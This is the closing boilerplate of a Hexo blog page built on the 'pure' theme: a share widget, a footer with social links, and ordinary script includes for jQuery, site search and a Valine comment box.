    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
    
  </div>
  </div>
</nav>
  


</main>

  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
	
	
    <ul class="social-links">
    	
        <li><a href="/null" target="_blank" title="Github" ><i class="icon icon-github"></i></a></li>
        
        <li><a href="/null" target="_blank" title="Weibo" ><i class="icon icon-weibo"></i></a></li>
        
        <li><a href="/null" target="_blank" title="Twitter" ><i class="icon icon-twitter"></i></a></li>
        
        <li><a href="/null" target="_blank" title="Behance" ><i class="icon icon-behance"></i></a></li>
        
        <li><a href="/atom.xml" target="_blank" title="Rss" ><i class="icon icon-rss"></i></a></li>
        
    </ul>

    <div class="copyright">
    	
        <div class="publishby">
        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
        </div>
    </div>
</footer>
  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
<script>
window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
</script>

<script src="/js/plugin.min.js"></script>


<script src="/js/application.js"></script>


    <script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
            UNTITLED: '(Untitled)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>

<script src="/js/insight.js"></script>






   




   
    
  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/valine"></script>
  <script type="text/javascript">
  var GUEST = ['nick', 'mail', 'link'];
  var meta = 'nick,mail,link';
  meta = meta.split(',').filter(function(item) {
    return GUEST.indexOf(item) > -1;
  });
  new Valine({
    el: '#vcomments',
    verify: false,
    notify: false,
    appId: '',
    appKey: '',
    placeholder: 'Just go go',
    avatar: 'mm',
    meta: meta,
    pageSize: '10' || 10,
    visitor: false
  });
  </script>

     







</body>
</html>